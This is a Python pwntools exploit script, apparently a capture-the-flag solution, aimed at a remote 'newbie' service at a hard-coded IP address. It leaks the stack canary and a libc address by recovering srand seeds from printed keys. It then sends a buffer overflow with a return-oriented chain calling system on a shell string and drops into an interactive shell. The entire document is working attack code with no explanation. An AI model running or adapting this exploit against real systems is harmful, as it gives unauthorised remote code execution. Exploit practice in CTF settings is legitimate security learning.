#!/usr/bin/env python3
from pwn import *
import ctypes

def start(argv=[], *a, **kw):
  return remote('18.191.117.63', 31337, *a, **kw)

gs = '''
init-pwndbg
breakrva 0xdcd
c
'''.format(**locals())

# breakrva 0xd74

exe = './newbie'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.27.so', checksec=False)
context.log_level = 'debug'

canary_id = 49
libc_id = canary_id+24 # __libc_start_main+E7
lib_pop_rdi = 0x215bf
lib_ret = 0x8aa

lib = ctypes.cdll.LoadLibrary('./libc-2.27.so')
def check(n, key):
  chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  res = ''
  lib.srand(n)
  for i in range(32):
    res += chars[lib.rand() % 62]
  if(res == key):
    return True
  else:
    return False

def find2bAddr(key):
  val = 1000
  while(val < 0xffff):
    if(check(val, key)):
      return val
    else:
      val += 1

def leak(io, idx):
  io.sendlineafter(b'> ', b'id 000000'+ bytes(str(idx), 'utf-8'))
  io.sendlineafter(b'> ', b'create')
  io.recvuntil(b'Your key: ')
  return io.recvline()[:-1].decode('utf-8')

io = start()

canary = b''
for i in range(canary_id, canary_id + 4):
  canary += find2bAddr(leak(io, i)).to_bytes(2, 'little')

libc_leak = b''
for i in range(libc_id+2, libc_id-1, -1):
  libc_leak += find2bAddr(leak(io, i)).to_bytes(2, 'big')

libc.address = int(libc_leak.hex(), 16) - libc.sym['__libc_start_main'] - 0xe7
print(hex(libc.address))


payload = b'A'*88
payload += canary
payload += p64(0)
payload += p64(libc.address + lib_pop_rdi)
payload += p64(libc.address + 0x1b3e1a)
payload += p64(libc.address + lib_ret)
payload += p64(libc.address + 0x04f550)

io.sendline(payload)
io.sendlineafter(b'> ', b'quit')
io.interactive()